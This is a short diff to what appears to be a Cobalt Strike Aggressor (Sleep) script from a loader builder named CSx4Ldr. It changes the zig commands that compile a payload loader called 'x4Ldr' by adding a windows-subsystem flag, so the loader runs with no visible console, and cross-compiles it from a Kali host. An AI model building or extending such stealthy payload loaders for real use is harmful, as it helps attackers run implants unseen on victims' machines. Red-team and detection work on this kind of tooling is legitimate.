@@ -57,12 +57,12 @@ sub builder {
 
 		if ("*Windows*" iswm systemProperties()["os.name"]) {
 			$path = replace($path, "\\\\", "\\\\\\\\");
-			$cmd = "zig build-exe /tmp/temp.zig -fstrip -fsingle-threaded --name x4Ldr";
+			$cmd = "zig build-exe /tmp/temp.zig --subsystem windows -fstrip -fsingle-threaded --name x4Ldr";
 			$gofile = "C:\\\\windows\\\\temp\\\\temp.zig";
 			$clear = "del C:\\\\windows\\\\temp\\\\temp.zig";
 			$handle = openf("> $+ $gofile");
 		}else{
-			$cmd = "/home/kali/CSx4Ldr/zig/zig build-exe /tmp/temp.zig -fstrip -fsingle-threaded --name x4Ldr -target x86_64-windows";
+			$cmd = "/home/kali/CSx4Ldr/zig/zig build-exe /tmp/temp.zig --subsystem windows -fstrip -fsingle-threaded --name x4Ldr -target x86_64-windows";
             $zigfile = "/tmp/temp.zig";
 			$clear = "rm /tmp/temp.zig";
 			$handle = openf("> $+ $zigfile");
